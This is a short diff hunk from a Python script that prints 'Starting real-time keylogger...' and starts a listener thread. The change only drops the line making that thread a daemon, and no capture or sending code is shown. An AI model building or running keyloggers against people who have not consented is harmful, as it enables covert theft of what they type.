@@ -52,7 +52,6 @@ def start_listener():
 if __name__ == "__main__":
     print("Starting real-time keylogger...")
     listener_thread = threading.Thread(target=start_listener)
-    listener_thread.daemon = True
     listener_thread.start()
     
     # Keep the main thread alive
